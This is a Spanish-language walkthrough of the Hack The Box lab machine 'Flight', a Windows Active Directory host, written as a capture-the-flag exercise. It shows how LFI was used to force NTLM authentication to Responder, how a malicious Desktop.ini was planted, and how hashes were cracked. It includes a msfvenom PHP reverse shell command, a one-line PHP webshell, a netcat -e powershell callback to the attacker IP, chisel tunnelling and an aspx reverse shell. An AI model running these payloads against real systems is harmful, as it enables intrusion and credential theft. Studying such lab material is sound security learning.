#windows #ActiveDirectory #hard
### Ping

```python
ping -c 1 10.10.11.187
PING 10.10.11.187 (10.10.11.187) 56(84) bytes of data.
64 bytes from 10.10.11.187: icmp_seq=1 ttl=127 time=155 ms

--- 10.10.11.187 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 155.284/155.284/155.284/0.000 ms
```

### TTL = 127 Windows

### nmap

```python
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-10 11:22 EDT
Nmap scan report for 10.10.11.187
Host is up (0.16s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-10 22:22:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-10T22:23:44
|_  start_date: N/A
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.63 seconds
```

### Enumeración del puerto 80 (HTTP)
por el momento no tenemos nada interesante en la pagina web así que seguiremos enumerando.
![[Pasted image 20240810113207.png]]

### Fuzzing con wfuzz
haciendo una enumeración de subdominios logramos encontrar uno llamado `school`
![[Pasted image 20240810114633.png]]

`school`
parece que en la pagina web de `school` tampoco obtenemos nada interesante.
![[Pasted image 20240810114823.png]]

### Enumeración del puerto 53 (DNS)
en esta enumeración nos aseguramos que no existe otro nombre de dominio y también obtenemos la dirección ip V6
![[Pasted image 20240810115616.png]]

### dirsearch
usando `dirsearh` encontramos un `index.php` el cual esta haciendo referencia a una variable `$DATA` esto nos da una pista así que vamos a intentar un `LFI`
![[Pasted image 20240810122957.png]]

`LFI`
al realizar un `LFI` nos reporta que esta actividad es sospechosa y que por ende a sido bloqueada. esto es una buena señal ya que si podemos identificar como se esta realizando este bloqueo podemos intentar bypasearlo
![[Pasted image 20240810123158.png]]

`LFI`
probamos con las rutas absolutas y funciono. parece que esta bloqueando el parámetro `../`
![[Pasted image 20240810123844.png]]

### Fuzzing con wfuzz 
con estos parámetros vamos a realizar un fuzzing con una lista de palabras especificas para Windows.

```python
❯ wfuzz -f ./fuzz-output.csv,csv -c -w file_inclusion_windows.txt --hw 89,95 "http://school.flight.htb/index.php?view=FUZZ"
```

![[Pasted image 20240810124631.png]]

### responder
vamos a iniciar el responder para posteriormente hacer una petición e intentar envenenar el trafico y poder capturar un `hash NTLMv2` 
![[Pasted image 20240810125124.png]]

`hash NTLMv2`
ahora solo vamos a forzar la autenticación contra los recursos compartidos de nuestra maquina atacante navegando a esta dirección `http://school.flight.htb/index.php?view=//10.10.14.8/share` de esta manera la maquina se autentica contra nosotros y podemos capturar el `hash NTLMv2`
![[Pasted image 20240810125817.png]]

### hashcat

![[Pasted image 20240810130537.png]]

`PASS`
después de esperar un rato vemos que hashcat ha podido identificar la contraseña del usuario `svc_apache`
![[Pasted image 20240810131709.png]]

### Validación de credenciales
podemos validar las credenciales que hemos conseguido y parecen ser validas para enumerar los recursos smb pero no podemos conectarnos por `evil-winrm` esto es normal ya que las cuentas de servicios como en este caso no cuentan con esta opción 
![[Pasted image 20240810132329.png]]

### crackmapexec
hacemos una enumeración para obtener usuarios potenciales del sistema.
![[Pasted image 20240810132635.png]]

### crackmapexec
hacemos una validación con la contraseña y la lista de usuarios que hemos conseguido y obtenemos una coincidencia para el usuario `S.Moon` 
![[Pasted image 20240810133411.png]]

### crackmapexec
con este usuario tenemos permisos de lectura y de escritura en el recurso `Shared` lo cual nos permite realizar un nuevo ataque e intentar capturar otro `hash NTLMv2` 
![[Pasted image 20240810134450.png]]

### Responder
en este caso ya que tenemos permisos de escritura en este recurso podemos vamos a crear un archivo que intente llamar el recurso en nuestra maquina para ver si algún otro usuario intenta acceder a este recurso y así poder obtener un segundo hash `NTMLv2` 

primero vamos a crear el archivo `Desktop.ini`
```python
[Shell]
Command=2
IconFile=\\10.10.14.8\share\hello.ico
[Taskbar]
Command=ToggleDesktop
```

ahora vamos a estar a la escucha con el responder y vamos a subir el archivo `Desktop.ini` a los recursos compartidos y esperamos que algún usuario intente conectarse
![[Pasted image 20240810140010.png]]

### crackmapexec
aplicamos los mismos pasos con la herramienta `hashcat` para descifrar el nuevo hash `NTLMv2` y de esta manera obtener las credenciales del usuario c.bum. en este momento con el usuario c.bum podemos leer y escribir en el recurso compartido `Web` por lo que nos vamos a aprovechar de esto.
![[Pasted image 20240810140848.png]]

### smbclient 
una ves dentro de los recursos compartidos de `c.bum` podemos navegar hasta el directorio `Web` y dentro tenemos el directorio `school.flig.htb` en el cual podemos ver los diferentes archivos.
![[Pasted image 20240810141543.png]]

### Reverse shell
en este punto vamos a crear una reverse shell usando `msfvenom` para subirla a este recurso compartido y luego llamarla desde la web para poder obtener una conexión

```python
msfvenom -p php/reverse_php LHOST=10.10.14.8 LPORT=9001 -f raw > rawr.php
```

después de crear la reverse shell la subimos al recurso compartido y ya solo debemos llamarlo desde la web o incluso haciendo un curl a la dirección `http://school.flight.htb/rawr.php` 

#Nota debido a que esta shell no es totalmente interactiva y se pierde la conexión nada cierto tiempo vamos a realizar otro enfoque
![[Pasted image 20240810142207.png]]

### shell
primero que nada vamos a crear un archivo PHP que nos permita tener ejecución de comandos a través de CMD

```python
<?php
	system($_GET['cmd']);
?>
```

luego vamos a cargar este archivo al recurso compartido de la misma manera que hicimos antes. esto nos permite ejecutar comandos a través de la URL. 
![[Pasted image 20240810144420.png]]

ahora vamos a localizar el binario de netcat para poder subirlo a la maquina 

```python
❯ locate netcat.exe

/home/gleoq/Desktop/Hack-The-Box/Advanced-Labs/Context/netcat.exe # esta es la ruta del archivo

❯ cp /home/gleoq/Desktop/Hack-The-Box/Advanced-Labs/Context/netcat.exe .

```

ahora que ya tenemos el binario en nuestra ubicación de trabajo vamos a subirlo al recurso compartido de la misma manera que hemos hecho con los otros archivos. 

```python
put shell.php

put netcat.exe
```

ahora solo debemos cargar los dos archivos y luego podemos ejecutarlo desde la web con el siguiente comando
`http://school.flight.htb/shell.php?cmd=netcat.exe -e powershell.exe 10.10.14.8 9001`
![[Pasted image 20240810145130.png]]

### Escalada De privilegios
una ves dentro de la maquina podemos ver el directorio `inetpub` La carpeta Inetpub, hace referencia a los servicios que permiten hacer configuraciones de tipo servidor en el sistema. lo cual me hace pensar que esta corriendo algún servicio tipo web internamente en la maquina
![[Pasted image 20240810150156.png]]

`8000`
también podemos ver el puerto 8000 que esta en escucha lo cual me parece raro ya que este puerto no estaba en mi escaneo de `nmap`

Dado que el firewall cierra el puerto 8000, no podemos acceder a este sitio externamente. Necesitaremos reenviar el puerto 8000 a nuestra máquina local a través de un túnel inverso. 
![[Pasted image 20240810150605.png]]

### User Pivoting
primero que nada vamos a cambiarnos de usuario ya que actualmente somos el usuario `svc_apache` pero recordemos que tenemos las credenciales del usuario `c.bum` para ello lo primero que debemos hacer es descargar el binario `Runas.exe` y subirlo a la maquina. una vez ua tengamos este binario solo debemos ejecutarlo usando el siguiente comando:

```python
.\runas.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.8:9009
```

de esta manera obtenemos una shell como el usuario `c.bum`
![[Pasted image 20240810152657.png]]

### Port Forwarding
ahora que somos el usuario c.bum solo debemos realizar un `PortForwarding` para poder tener acceso al puerto 8000 que esta de manera interna en la maquina. para ello primero vamos a realizar un túnel inverso con chisel

```python
❯ ./chisel server -p 9005 --reverse
```

![[Pasted image 20240810173920.png]]

`Tunneling`
luego en la maquina victima debemos ejecutar el siguiente comando para enviar la conexión del puerto 8000 a nuestra maquina. esta conexión viajara por el túnel que hemos creado

```python
PS C:\tmp> .\chisel.exe client 10.10.14.8:9005 R:8000:127.0.0.1:8000
```

![[Pasted image 20240810174105.png]]

### Enumeración del puerto 8000 (PortForwarding)
en la web no vemos nada interesante sin embargo podemos investigar el directorio donde se esta ejecutando 
![[Pasted image 20240810174306.png]]

`PortForwarding`
ahora que ya tenemos la conexión y podemos ver la web en nuestra maquina local podemos hacer varias pruebas. lo primero que se me ocurre es crear un archivo HTML que nos permita establecer una reverse shell desde esta web para saber si se esta recibiendo como `administrator`
![[Pasted image 20240810175305.png]]

`shell.aspx`
en este pinto he utilizado una reverse shell con formato aspx [shell.aspx](https://github.com/borjmz/aspx-reverse-shell) y luego simplemente la hemos ejecutado desde el navegador llamando la ruta `http://127.0.0.1:8000/shell.aspx` y efectivamente obtenemos otro usuario pero no es el usuario administrador
![[Pasted image 20240810180057.png]]

`whoami /all`
enumerando este usuario podemos ver que cuenta con el permiso de `SeImpersonatePrivilege - Impersonate a client after authentication Enabled`
![[Pasted image 20240810180639.png]]

`Rubeus`
Ahora que tenemos un ticket válido para la cuenta de la máquina, necesitamos convertirlo del formato base64 - kirbi a ccache para usarlo con impacket. Para la conversión, escribimos la salida del ticket en un archivo llamado ticket.b64 y luego ejecutamos la siguiente cadena de comandos para obtener el hash del administrador.
![[Pasted image 20240810194913.png]]


![[Pasted image 20240810201316.png]]